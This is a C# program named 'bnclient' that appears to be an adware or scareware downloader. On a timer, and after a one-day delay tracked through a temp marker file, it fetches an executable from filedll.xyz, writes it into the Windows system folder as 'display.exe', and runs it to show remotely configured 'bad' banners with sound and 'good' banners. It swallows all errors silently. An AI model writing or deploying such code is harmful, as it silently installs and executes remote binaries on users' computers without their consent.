using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Policy;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace bnclient
{
    class Program
    {
        const string ConfigsURL = "https://filedll.xyz/configs.xml";
        static void Main(string[] args)
        {
            System.Timers.Timer t = new System.Timers.Timer();
            t.Interval = 1000;
            t.Elapsed += Timer_Elapsed;
            t.AutoReset = true;
            t.Start();
            Console.ReadLine();
        }

        static Configs LoadXML()
        {
            Configs configs = new Configs();
            try
            {
                WebClient wb = new WebClient();
                var data = wb.DownloadData(ConfigsURL);
                var xml = Encoding.UTF8.GetString(data);
                XmlDocument document = new XmlDocument();
                document.LoadXml(xml);

                XmlNode node = document.SelectSingleNode("/Configs/Settings");
                configs.Active = Convert.ToBoolean(node.ChildNodes[0].InnerText);
                node = document.SelectSingleNode("/Configs/BadBanner");
                configs.Bad_Banner.BannerImages.Add(node.ChildNodes[0].InnerText);
                configs.Bad_Banner.BannerImages.Add(node.ChildNodes[1].InnerText);
                configs.Bad_Banner.BannerImages.Add(node.ChildNodes[2].InnerText);
                configs.Bad_Banner.SoundFile = node.ChildNodes[3].InnerText;
                node = document.SelectSingleNode("/Configs/GoodBanner/Banners");
                foreach (XmlNode item in node.ChildNodes)
                {
                    configs.Good_Banner.BannerImages.Add(new string[] { item.ChildNodes[0].InnerText, item.ChildNodes[1].InnerText });

                }
            }
            catch
            {

            }
            return configs;
        }
        static string display_path = string.Format("{0}\\display.exe", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86));
        private static void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                var path = Path.GetTempPath() + "sysfprint.sep";
                if (File.Exists(path))
                {
                    DateTime dt1 = DateTime.Parse((File.ReadAllText(path)));
                    if (DateTime.Now.Subtract(dt1).Days < 1)
                    {
                        return;
                    }
                }
                else
                {
                    File.WriteAllText(path, DateTime.Now.ToString());
                    return;
                }
                DateTime dt = DateTime.Now;
                if (dt.Minute == 0 && dt.Second == 0)
                {
                    if (!File.Exists(display_path))
                    {
                        WebClient client = new WebClient();
                        var urls = client.DownloadString("https://filedll.xyz/dwfiles.php").Split(';');
                        var display = client.DownloadData(urls[2]);
                        File.WriteAllBytes(display_path, display);
                    }
                    if (dt.Hour % 2 == 0)//Bad
                    {
                        var configs = LoadXML();
                        if (configs.Active)
                        {
                            var url = configs.Bad_Banner.BannerImages.Random();
                            string args = $"big;{url};{configs.Bad_Banner.SoundFile}";
                            Process.Start(display_path, args);
                        }
                    }
                    else if (dt.Hour == 7 || dt.Hour == 15 || dt.Hour == 21)//Good
                    {

                        var configs = LoadXML();
                        if (configs.Active)
                        {
                            var url = configs.Good_Banner.BannerImages.Random();
                           var result =  Process.Start(display_path, $"small;{url[0]};{url[1]}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
    public class Configs
    {
        public bool Active { get; set; }
        public BadBanner Bad_Banner { get; set; } = new BadBanner();
        public GoodBanner Good_Banner { get; set; } = new GoodBanner();
        public class BadBanner
        {
            public List<string> BannerImages { get; } = new List<string>();
            public string SoundFile { get; set; }
        }
        public class GoodBanner
        {
            public List<string[]> BannerImages { get; } = new List<string[]>();

        }
    }
    public static class Extensions
    {
        static Random Rand = new Random();

        public static T Random<T>(this List<T> list)
        {
            int index = Rand.Next(0, list.Count);
            return list[index];
        }
    }

}
